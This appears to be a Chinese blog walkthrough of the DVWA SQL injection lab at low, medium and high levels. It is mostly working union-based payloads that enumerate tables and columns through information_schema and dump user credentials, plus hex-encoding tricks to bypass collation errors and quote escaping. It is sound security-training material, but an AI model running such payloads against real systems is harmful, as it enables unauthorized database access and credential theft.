---
title: DVWA-SQL Injection
date: 2021-04-09 19:36:49
tags: DVWA
---

### LOW 级别

**判断存在注入**

`?id=1`正常回显

`?id=1'`报错

`?id=1'--+`回显正常,说明存在符号型注入,闭合方式为`'`

**爆字段**

`?id=1' order by 2--+`回显正常

`?id=1'+order+by+3--+`报错,说明字段数为 2

**报显示位**

`?id='+union+select+1,2--+`显示位 1,2

**查表**

`?id=1'+union+select+1,group_concat(table_name)+from+information_schema.tables+where+table_schema=database()--+`

报错`Illegal mix of collations for operation 'UNION'`

通过百度,这是由于编码的某种问题造成的,可以使用 16 进制进行读取

`?id=1'+union+select+1,concat_ws('~',hex(table_name))+from+information_schema.tables+where+table_schema=database()--+`

之后再解码就好

**查列**

`?id=1'+union+select+1,concat_ws('~',hex(column_name))+from+information_schema.columns+where+table_name='users'+and+table_schema=database()--+`

**查数据**

`?id=1'+union+select+1,group_concat(hex(user),',',hex(password))+from+users--+`

也可以直接使用 unhex 函数  
`?id=1'+union+select+1,group_concat(unhex(hex(user)),',',unhex(hex(password))+from+users--+`

### medium 级别

这关换成了 post 请求

burp 抓包,操作同 low 级别一样,发现单引号会被转义,查列的时候`where+table_name='users'`可以转换为 16 进制**users 的 十六进制为 0x75736572**

### high 级别

```
1' union select user,password from users#
```

直接结束?
